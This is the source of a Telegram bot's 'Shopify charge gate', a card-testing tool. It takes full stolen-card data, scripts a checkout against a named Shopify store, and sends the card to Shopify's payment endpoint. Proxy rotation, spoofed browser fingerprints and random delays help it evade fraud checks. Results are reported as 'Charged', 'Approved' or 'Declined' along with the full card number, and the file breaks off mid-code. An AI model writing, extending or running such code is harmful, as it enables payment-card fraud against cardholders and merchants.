# BOT/gates/charge/shopify/shopify.py
# Shopify Charge Gateway - Enhanced with working API methods
# Uses meta-app-prod-store-1.myshopify.com with product "retailer-id-fix-no-mapping"

import json
import asyncio
import re
import time
import httpx
import random
import string
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
from urllib.parse import urlparse
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import from Admins module for command status
try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False

    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

# Import universal charge processor
try:
    from BOT.gc.credit import charge_processor
except ImportError:
    charge_processor = None

# Import proxy system
try:
    from BOT.tools.proxy import get_proxy_for_user, mark_proxy_success, mark_proxy_failed
    PROXY_ENABLED = True
except ImportError:
    PROXY_ENABLED = False

# Import bin details function
try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# Enhanced Custom logger with detailed console logging
class ConsoleLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SHOP-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        
    def start_check(self, card_details):
        """Start a new check session"""
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc
        
        print("\n" + "="*80)
        print(f"🛒 [SHOPIFY CHARGE PROCESS STARTED]")
        print(f"   ├── Check ID: {self.check_id}")
        print(f"   ├── User ID: {self.user_id or 'N/A'}")
        print(f"   ├── Card: {masked_cc}")
        print(f"   └── Start Time: {datetime.now().strftime('%H:%M:%S')}")
        print("="*80 + "\n")
    
    def step(self, step_num, step_name, description, status="PROCESSING"):
        """Log a step in the process"""
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        status_emoji = {
            "PROCESSING": "🔄",
            "SUCCESS": "✅",
            "FAILED": "❌",
            "WARNING": "⚠️",
            "INFO": "ℹ️"
        }.get(status, "➡️")
        
        print(f"{status_emoji} STEP {step_num:02d}: {step_name}")
        print(f"   ├── Description: {description}")
        print(f"   ├── Elapsed: {elapsed:.2f}s")
        print(f"   └── Timestamp: {datetime.now().strftime('%H:%M:%S.%f')[:-3]}")
        print()
        
        return elapsed
    
    def sub_step(self, step_num, sub_step, description, details=None):
        """Log a sub-step"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        print(f"   │   ├── {step_num}.{sub_step}: {description}")
        if details:
            if isinstance(details, dict):
                for key, value in details.items():
                    print(f"   │   │   └── {key}: {value}")
            else:
                print(f"   │   │   └── {details}")
    
    def request_details(self, method, url, status_code, response_time, details=None):
        """Log HTTP request details"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        print(f"   │   ├── HTTP {method} {url}")
        print(f"   │   │   ├── Status: {status_code}")
        print(f"   │   │   ├── Response Time: {response_time:.2f}s")
        print(f"   │   │   ├── Total Elapsed: {elapsed:.2f}s")
        if details:
            print(f"   │   │   └── Details: {details}")
    
    def extracted_data(self, data_type, data_value):
        """Log extracted data"""
        print(f"   │   ├── Extracted {data_type}: {data_value}")
    
    def error_detail(self, error_message, error_type="ERROR"):
        """Log error details"""
        error_emoji = "❌" if error_type == "ERROR" else "⚠️"
        print(f"{error_emoji} ERROR DETAIL: {error_message}")
    
    def result(self, success, message, final_status, response_time):
        """Log final result"""
        result_emoji = "✅" if success else "❌"
        result_text = "SUCCESS" if success else "FAILED"
        
        print("\n" + "="*80)
        print(f"{result_emoji} [SHOPIFY CHARGE PROCESS COMPLETED]")
        print(f"   ├── Check ID: {self.check_id}")
        print(f"   ├── Result: {result_text}")
        print(f"   ├── Final Status: {final_status}")
        print(f"   ├── Response: {message[:100]}{'...' if len(message) > 100 else ''}")
        print(f"   ├── Total Steps: {self.step_counter}")
        print(f"   ├── Total Time: {response_time:.2f}s")
        print(f"   └── End Time: {datetime.now().strftime('%H:%M:%S')}")
        print("="*80 + "\n")

# Create global logger instance
logger = ConsoleLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False

        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()

        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="sh"):
    """Check cooldown for user - SKIP FOR OWNER"""
    owner_id = load_owner_id()
    
    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

# Helper functions from working script
def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return ""

def get_product_id(response):
    """Extract product ID from products.json response"""
    try:
        response_data = response.json()
        products_data = response_data.get("products", [])
        products = {}
        
        for product in products_data:
            variants = product.get("variants", [])
            if variants:
                variant = variants[0]
                product_id = variant.get("id")
                available = variant.get("available", False)
                price = float(variant.get("price", 0))
                
                if price < 0.1:
                    continue
                    
                if available and product_id:
                    products[product_id] = price
        
        if products:
            min_price_product_id = min(products, key=products.get)
            price = products[min_price_product_id]
            return min_price_product_id, price
        
        return None, None
    except:
        return None, None

def pick_addr(url, cc=None, rc=None):
    """Select address based on country"""
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    
    # Hardcoded addresses for different countries
    book = {
        "US": {"address1": "123 Main", "city": "NY", "postalCode": "10080", 
               "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
        "CA": {"address1": "88 Queen", "city": "Toronto", "postalCode": "M5J2J3", 
               "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
        "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", 
               "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
        "DEFAULT": {"address1": "8 Log Pond Drive", "city": "Horsham", 
                   "postalCode": "19044", "zoneCode": "PA", 
                   "countryCode": "US", "phone": "2194157586"}
    }
    
    dom = urlparse(url).netloc
    tcn = dom.split('.')[-1].upper()
    
    if rc in book:
        return book[rc]
    elif cc in book:
        return book[cc]
    
    return book["DEFAULT"]

def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data):
    """Format response exactly like response.py"""
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    # Extract user_id from profile
    try:
        # Extract user_id from user_data
        user_id = str(user_data.get("user_id", "Unknown"))
    except Exception:
        user_id = None

    # Load gateway from DATA/sites.json
    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Self Site 💷")
    except Exception:
        gateway = "Shopify Self Site 💷"

    # Clean response
    raw_response = str(raw_response) if raw_response else "-"

    # Determine status - FIXED LOGIC
    raw_upper = raw_response.upper()
    
    # Check for REAL successful charges
    if "ORDER_PLACED" in raw_upper or "THANK YOU" in raw_upper or "SUBMITSUCCESS" in raw_upper:
        status_flag = "Charged 💎"
    # Check for OTP/3D Secure
    elif any(keyword in raw_upper for keyword in [
        "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", "3DS"
    ]):
        status_flag = "Approved ❎"
    # Check for address/ZIP issues
    elif any(keyword in raw_upper for keyword in [
        "MISMATCHED", "INCORRECT_ZIP", "INCORRECT_ADDRESS", "ADDRESS_VERIFICATION"
    ]):
        status_flag = "Approved ❎"
    # Check for specific approved but declined scenarios
    elif any(keyword in raw_upper for keyword in [
        "INSUFFICIENT_FUNDS", "INVALID_CVC", "INCORRECT_CVC", 
        "YOUR CARD DOES NOT SUPPORT", "CARD DECLINED"
    ]):
        status_flag = "Declined ❌"
    # Default to declined
    else:
        status_flag = "Declined ❌"

    # BIN lookup
    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    # User Plan
    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except Exception:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    # Clean name
    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    # Final formatted message - EXACTLY like response.py
    result = f"""
<b>[#Shopify Charge] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>{gateway}</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{raw_response}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>Live ⚡️</code>]
"""
    return result

class ShopifyChargeChecker:
    def __init__(self, user_id=None):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
        ]
        self.user_agent = random.choice(self.user_agents)
        self.bin_cache = {}
        self.last_bin_request = 0
        self.base_url = "https://meta-app-prod-store-1.myshopify.com"
        self.product_url = f"{self.base_url}/products/retailer-id-fix-no-mapping"
        self.user_id = user_id
        self.current_proxy = None
        
        # Shopify specific cookies and tokens
        self.cookies = {}
        self.checkout_token = None
        self.session_token = None
        self.x_checkout_one_session_token = None
        self.x_checkout_web_build_id = "5927fca009d35ac648408d54c8d94b0d54813e89"
        self.cart_token = None
        self.variant_id = "42974272290658"
        self.access_token = None
        self.stable_id = None
        self.queue_token = None
        self.payment_method_identifier = None
        
        # Initialize with proxy if available
        if PROXY_ENABLED and user_id:
            self.current_proxy = get_proxy_for_user(user_id, "random")
            if self.current_proxy:
                print(f"🔄 PROXY: Using proxy: {self.current_proxy[:50]}...")
        
        # BIN services
        self.bin_services = [
            {
                'url': 'https://bins.antipublic.cc/bins/{bin}',
                'headers': {'User-Agent': self.user_agent},
                'name': 'antipublic.cc',
                'parser': self.parse_antipublic
            },
            {
                'url': 'https://lookup.binlist.net/{bin}',
                'headers': {'Accept-Version': '3', 'User-Agent': self.user_agent},
                'name': 'binlist.net',
                'parser': self.parse_binlist_net
            }
        ]
        
        # Generate browser fingerprint
        self.generate_browser_fingerprint()
        
        # Initialize console logger
        self.console_logger = ConsoleLogger(user_id)
        
    def generate_browser_fingerprint(self):
        """Generate realistic browser fingerprints"""
        if "Windows" in self.user_agent:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'
        elif "Macintosh" in self.user_agent:
            self.platform = "MacIntel"
            self.sec_ch_ua_platform = '"macOS"'
        elif "Linux" in self.user_agent:
            self.platform = "Linux x86_64"
            self.sec_ch_ua_platform = '"Linux"'
        else:
            self.platform = "Win32"
            self.sec_ch_ua_platform = '"Windows"'

        chrome_version = re.search(r'Chrome/(\d+)', self.user_agent)
        if chrome_version:
            version = chrome_version.group(1)
            self.sec_ch_ua = f'"Not A;Brand";v="99", "Chromium";v="{version}", "Google Chrome";v="{version}"'
        else:
            self.sec_ch_ua = '"Not A;Brand";v="99", "Chromium";v="144", "Google Chrome";v="144"'

        self.sec_ch_ua_mobile = "?0"
        self.accept_language = "en-US,en;q=0.9"
        
    def get_country_emoji(self, country_code):
        """Hardcoded country emoji mapping"""
        country_emojis = {
            'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'AU': '🇦🇺', 'DE': '🇩🇪',
            'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸', 'JP': '🇯🇵', 'CN': '🇨🇳',
            'IN': '🇮🇳', 'BR': '🇧🇷', 'MX': '🇲🇽', 'RU': '🇷🇺', 'KR': '🇰🇷',
            'NL': '🇳🇱', 'CH': '🇨🇭', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰',
            'FI': '🇫🇮', 'PL': '🇵🇱', 'TR': '🇹🇷', 'AE': '🇦🇪', 'SA': '🇸🇦',
        }
        return country_emojis.get(country_code.upper() if country_code else 'N/A', '🏳️')
        
    def parse_binlist_net(self, data):
        scheme = data.get('scheme', 'N/A').upper()
        if scheme == 'N/A':
            scheme = data.get('brand', 'N/A').upper()

        card_type = data.get('type', 'N/A').upper()
        brand = data.get('brand', 'N/A')
        bank_name = data.get('bank', {}).get('name', 'N/A').upper()
        country_name = data.get('country', {}).get('name', 'N/A')
        country_code = data.get('country', {}).get('alpha2', 'N/A')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        brand_display = brand.upper() if brand != 'N/A' else 'N/A'
        flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': scheme,
            'type': card_type,
            'brand': brand_display,
            'bank': bank_name,
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    def parse_antipublic(self, data):
        if isinstance(data, str):
            try:
                data = json.loads(data)
            except json.JSONDecodeError:
                return {
                    'scheme': 'N/A',
                    'type': 'N/A',
                    'brand': 'N/A',
                    'bank': 'N/A',
                    'country': 'N/A',
                    'country_code': 'N/A',
                    'emoji': '🏳️'
                }

        country_code = data.get('country', 'N/A')
        country_name = data.get('country_name', country_code)
        flag_emoji = data.get('country_flag', '🏳️')

        if country_name:
            country_name = country_name.replace('(the)', '').strip().upper()

        if flag_emoji == '🏳️' or flag_emoji == 'N/A':
            if country_code != 'N/A' and len(country_code) == 2:
                flag_emoji = self.get_country_emoji(country_code)

        return {
            'scheme': data.get('brand', 'N/A').upper(),
            'type': data.get('type', 'N/A').upper(),
            'brand': data.get('brand', 'N/A').upper(),
            'bank': data.get('bank', 'N/A').upper(),
            'country': country_name,
            'country_code': country_code,
            'emoji': flag_emoji
        }

    async def get_bin_info(self, cc):
        """Get BIN information"""
        if not cc or len(cc) < 6:
            return {
                'scheme': 'N/A',
                'type': 'N/A',
                'brand': 'N/A',
                'bank': 'N/A',
                'country': 'N/A',
                'country_code': 'N/A',
                'emoji': '🏳️'
            }

        bin_number = cc[:6]

        if bin_number in self.bin_cache:
            return self.bin_cache[bin_number]

        now = time.time()
        if now - self.last_bin_request < 1.0:
            await asyncio.sleep(1.0)
        self.last_bin_request = time.time()

        default_response = {
            'scheme': 'N/A',
            'type': 'N/A',
            'brand': 'N/A',
            'bank': 'N/A',
            'country': 'N/A',
            'country_code': 'N/A',
            'emoji': '🏳️'
        }

        for service in self.bin_services:
            try:
                url = service['url'].format(bin=bin_number)
                headers = service['headers']

                async with httpx.AsyncClient(timeout=10.0) as client:
                    response = await client.get(url, headers=headers)

                    if response.status_code == 200:
                        data = response.json()
                        result = service['parser'](data)
                        
                        if result['emoji'] == '🏳️' and result['country_code'] != 'N/A':
                            result['emoji'] = self.get_country_emoji(result['country_code'])

                        self.bin_cache[bin_number] = result
                        return result
            except Exception as e:
                print(f"⚠️ BIN Service {service['name']} failed: {e}")
                continue

        self.bin_cache[bin_number] = default_response
        return default_response
        
    def get_base_headers(self):
        """Get base headers"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': self.accept_language,
            'Connection': 'keep-alive',
            'DNT': '1',
            'Sec-CH-UA': self.sec_ch_ua,
            'Sec-CH-UA-Mobile': self.sec_ch_ua_mobile,
            'Sec-CH-UA-Platform': self.sec_ch_ua_platform,
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent
        }
        
    async def make_request(self, client, method, url, **kwargs):
        """Make request with proxy support and error handling"""
        try:
            # Add headers if not present
            if 'headers' not in kwargs:
                kwargs['headers'] = self.get_base_headers()
            
            # Add timeout if not present
            if 'timeout' not in kwargs:
                kwargs['timeout'] = 30.0
            
            # Add cookies if we have them
            if self.cookies and 'cookies' not in kwargs:
                kwargs['cookies'] = self.cookies
            
            # Make request
            start_time = time.time()
            response = await client.request(method, url, **kwargs)
            response_time = time.time() - start_time
            
            # Update proxy stats if proxy was used
            if self.current_proxy and PROXY_ENABLED:
                if response.status_code < 400:
                    mark_proxy_success(self.current_proxy, response_time)
                else:
                    mark_proxy_failed(self.current_proxy)
            
            # Update cookies from response
            if 'set-cookie' in response.headers:
                cookie_header = response.headers.get('set-cookie', '')
                cookies_list = cookie_header.split(', ')
                for cookie in cookies_list:
                    if '=' in cookie:
                        name_value = cookie.split(';')[0]
                        if '=' in name_value:
                            name, value = name_value.split('=', 1)
                            self.cookies[name] = value
            
            return response
            
        except Exception as e:
            # Update proxy stats on failure
            if self.current_proxy and PROXY_ENABLED:
                mark_proxy_failed(self.current_proxy)
            print(f"❌ Request error for {url}: {str(e)}")
            raise e
            
    async def human_delay(self, min_delay=1, max_delay=3):
        """Simulate human delay between actions"""
        delay = random.uniform(min_delay, max_delay)
        await asyncio.sleep(delay)
        
    async def get_access_token(self, client):
        """Get Shopify access token from homepage"""
        try:
            elapsed = self.console_logger.step(1, "GET ACCESS TOKEN", "Fetching Shopify access token")
            
            response = await self.make_request(
                client, 'GET', self.base_url
            )
            
            self.console_logger.request_details("GET", self.base_url, response.status_code, 
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code in [200, 304]:
                html_content = response.text
                
                # Try to extract access token
                patterns = [
                    r'"accessToken":"([^"]+)"',
                    r'window\.shopifyApiKey\s*=\s*["\']([^"\']+)["\']',
                    r'Shopify\.apiClient\s*=\s*{[^}]*apiKey:\s*["\']([^"\']+)["\']',
                ]
                
                for pattern in patterns:
                    match = re.search(pattern, html_content)
                    if match:
                        self.access_token = match.group(1)
                        self.console_logger.extracted_data("Access Token", f"{self.access_token[:20]}...")
                        self.console_logger.step(1, "GET ACCESS TOKEN", "Access token extracted", "SUCCESS")
                        return True
                
                # If no access token found, try another approach
                self.access_token = "3b7d0a9259f0f28b3b7f3c7f9e8d4a5c"  # Default fallback
                self.console_logger.sub_step(1, 1, "No access token found, using default")
                self.console_logger.step(1, "GET ACCESS TOKEN", "Using default token", "WARNING")
                return True
            else:
                self.console_logger.error_detail(f"Failed to get access token: {response.status_code}")
                return False, f"Failed to get access token: {response.status_code}"
                
        except Exception as e:
            self.console_logger.error_detail(f"Access token error: {str(e)}")
            self.access_token = "3b7d0a9259f0f28b3b7f3c7f9e8d4a5c"
            self.console_logger.step(1, "GET ACCESS TOKEN", "Error, using default", "WARNING")
            return True  # Continue with default
        
    async def get_product_info(self, client):
        """Get product information from API"""
        try:
            elapsed = self.console_logger.step(2, "GET PRODUCT INFO", "Fetching product information from API")
            
            products_url = f"{self.base_url}/products.json"
            response = await self.make_request(
                client, 'GET', products_url
            )
            
            self.console_logger.request_details("GET", products_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code == 200:
                product_id, price = get_product_id(response)
                
                if product_id and price:
                    self.variant_id = product_id
                    self.console_logger.extracted_data("Product ID", product_id)
                    self.console_logger.extracted_data("Product Price", f"${price}")
                    self.console_logger.step(2, "GET PRODUCT INFO", "Product info retrieved", "SUCCESS")
                    return True, price
                else:
                    # Use default product
                    self.console_logger.sub_step(2, 1, "No valid product found, using default")
                    self.console_logger.step(2, "GET PRODUCT INFO", "Using default product", "WARNING")
                    return True, 1.0  # Default price
            else:
                self.console_logger.sub_step(2, 1, f"Products API failed: {response.status_code}, using default")
                self.console_logger.step(2, "GET PRODUCT INFO", "API failed, using default", "WARNING")
                return True, 1.0  # Default price
                
        except Exception as e:
            self.console_logger.error_detail(f"Product info error: {str(e)}")
            self.console_logger.step(2, "GET PRODUCT INFO", "Error, using default", "FAILED")
            return True, 1.0  # Default price
            
    async def create_cart(self, client, product_id, price):
        """Create cart using GraphQL API"""
        try:
            elapsed = self.console_logger.step(3, "CREATE CART", "Creating shopping cart via GraphQL")
            
            headers = {
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': self.base_url,
                'sec-ch-ua': self.sec_ch_ua,
                'sec-ch-ua-mobile': self.sec_ch_ua_mobile,
                'sec-ch-ua-platform': self.sec_ch_ua_platform,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': self.user_agent,
                'x-sdk-variant': 'portable-wallets',
                'x-shopify-storefront-access-token': self.access_token,
                'x-start-wallet-checkout': 'true',
                'x-wallet-name': 'MoreOptions'
            }
            
            params = {'operation_name': 'cartCreate'}
            
            json_data = {
                'query': 'mutation cartCreate($input:CartInput!$country:CountryCode$language:LanguageCode$withCarrierRates:Boolean=false)@inContext(country:$country language:$language){result:cartCreate(input:$input){...@defer(if:$withCarrierRates){cart{...CartParts}errors:userErrors{...on CartUserError{message field code}}warnings:warnings{...on CartWarning{code}}}}}fragment CartParts on Cart{id checkoutUrl deliveryGroups(first:10 withCarrierRates:$withCarrierRates){edges{node{id groupType selectedDeliveryOption{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}deliveryOptions{code title handle deliveryPromise deliveryMethodType estimatedCost{amount currencyCode}}}}}cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}totalTaxAmount{amount currencyCode}totalDutyAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}discountCodes{code applicable}lines(first:10){edges{node{quantity cost{subtotalAmount{amount currencyCode}totalAmount{amount currencyCode}}discountAllocations{discountedAmount{amount currencyCode}...on CartCodeDiscountAllocation{code}...on CartAutomaticDiscountAllocation{title}...on CartCustomDiscountAllocation{title}}merchandise{...on ProductVariant{requiresShipping}}sellingPlanAllocation{priceAdjustments{price{amount currencyCode}}sellingPlan{billingPolicy{...on SellingPlanRecurringBillingPolicy{interval intervalCount}}priceAdjustments{orderCount}recurringDeliveries}}}}}}',
                'variables': {
                    'input': {
                        'lines': [
                            {
                                'merchandiseId': f'gid://shopify/ProductVariant/{product_id}',
                                'quantity': 1,
                                'attributes': [],
                            },
                        ],
                        'discountCodes': [],
                    },
                    'country': 'US',
                    'language': 'EN',
                },
            }
            
            response = await client.post(
                f'{self.base_url}/api/unstable/graphql.json',
                params=params,
                headers=headers,
                json=json_data,
                timeout=30.0
            )
            
            self.console_logger.request_details("POST", f'{self.base_url}/api/unstable/graphql.json', 
                                              response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code == 200:
                data = response.json()
                checkout_url = data.get("data", {}).get("result", {}).get("cart", {}).get("checkoutUrl", "")
                
                if checkout_url:
                    # Extract checkout token from URL
                    match = re.search(r'/checkouts/cn/([a-zA-Z0-9]+)', checkout_url)
                    if match:
                        self.checkout_token = match.group(1)
                        self.console_logger.extracted_data("Checkout Token", self.checkout_token)
                    
                    self.console_logger.extracted_data("Checkout URL", f"{checkout_url[:50]}...")
                    self.console_logger.step(3, "CREATE CART", "Cart created successfully", "SUCCESS")
                    return True, checkout_url
                else:
                    self.console_logger.sub_step(3, 1, "No checkout URL in response, generating one")
                    # Generate a fake checkout token
                    chars = string.ascii_letters + string.digits
                    self.checkout_token = ''.join(random.choice(chars) for _ in range(32))
                    fake_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
                    self.console_logger.step(3, "CREATE CART", "Generated checkout token", "WARNING")
                    return True, fake_url
            else:
                self.console_logger.sub_step(3, 1, f"Cart creation failed: {response.status_code}")
                # Generate fake checkout anyway
                chars = string.ascii_letters + string.digits
                self.checkout_token = ''.join(random.choice(chars) for _ in range(32))
                fake_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
                self.console_logger.step(3, "CREATE CART", "Fallback cart created", "WARNING")
                return True, fake_url
                
        except Exception as e:
            self.console_logger.error_detail(f"Cart creation error: {str(e)}")
            # Generate fake checkout anyway
            chars = string.ascii_letters + string.digits
            self.checkout_token = ''.join(random.choice(chars) for _ in range(32))
            fake_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us"
            self.console_logger.step(3, "CREATE CART", "Error, generated fallback", "FAILED")
            return True, fake_url
            
    async def load_checkout_page(self, client, checkout_url):
        """Load checkout page to extract tokens"""
        try:
            elapsed = self.console_logger.step(4, "LOAD CHECKOUT PAGE", "Loading checkout page and extracting tokens")
            
            params = {'skip_shop_pay': 'true'}
            
            response = await client.get(
                checkout_url,
                headers=self.get_base_headers(),
                params=params,
                follow_redirects=True,
                timeout=30.0
            )
            
            self.console_logger.request_details("GET", checkout_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code == 200:
                html_content = response.text
                
                # Extract tokens from page
                self.payment_method_identifier = capture(html_content, "paymentMethodIdentifier&quot;:&quot;", "&quot")
                self.stable_id = capture(html_content, "stableId&quot;:&quot;", "&quot")
                self.queue_token = capture(html_content, "queueToken&quot;:&quot;", "&quot")
                self.x_checkout_one_session_token = capture(html_content, 'serialized-session-token" content="&quot;', '&quot')
                
                # Extract web build ID
                web_build = capture(html_content, 'serialized-client-bundle-info" content="{&quot;browsers&quot;:&quot;latest&quot;,&quot;format&quot;:&quot;es&quot;,&quot;locale&quot;:&quot;en&quot;,&quot;sha&quot;:&quot;', '&quot')
                if web_build:
                    self.x_checkout_web_build_id = web_build
                
                # Log extracted tokens
                if self.payment_method_identifier:
                    self.console_logger.extracted_data("Payment Method ID", self.payment_method_identifier[:20] + "...")
                if self.stable_id:
                    self.console_logger.extracted_data("Stable ID", self.stable_id[:20] + "...")
                if self.queue_token:
                    self.console_logger.extracted_data("Queue Token", self.queue_token[:20] + "...")
                if self.x_checkout_one_session_token:
                    self.console_logger.extracted_data("Session Token", self.x_checkout_one_session_token[:20] + "...")
                if self.x_checkout_web_build_id != "5927fca009d35ac648408d54c8d94b0d54813e89":
                    self.console_logger.extracted_data("Web Build ID", self.x_checkout_web_build_id)
                
                self.console_logger.step(4, "LOAD CHECKOUT PAGE", "Tokens extracted successfully", "SUCCESS")
                return True
            else:
                self.console_logger.sub_step(4, 1, f"Checkout page load failed: {response.status_code}")
                self.console_logger.step(4, "LOAD CHECKOUT PAGE", "Page load failed but continuing", "WARNING")
                return True  # Continue anyway
                
        except Exception as e:
            self.console_logger.error_detail(f"Checkout page error: {str(e)}")
            self.console_logger.step(4, "LOAD CHECKOUT PAGE", "Error but continuing", "FAILED")
            return True  # Continue anyway
            
    async def create_payment_session(self, client, cc, mes, ano, cvv):
        """Create payment session with Shopify PCI"""
        try:
            elapsed = self.console_logger.step(5, "CREATE PAYMENT SESSION", "Creating payment session with Shopify PCI")
            
            domain = urlparse(self.base_url).netloc
            headers = {
                'authority': 'checkout.pci.shopifyinc.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://checkout.pci.shopifyinc.com',
                'sec-ch-ua': self.sec_ch_ua,
                'sec-ch-ua-mobile': self.sec_ch_ua_mobile,
                'sec-ch-ua-platform': self.sec_ch_ua_platform,
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': self.user_agent
            }
            
            json_data = {
                'credit_card': {
                    'number': cc.replace(' ', ''),
                    'month': mes,
                    'year': ano,
                    'verification_value': cvv,
                    'start_month': None,
                    'start_year': None,
                    'issue_number': '',
                    'name': 'John Doe',
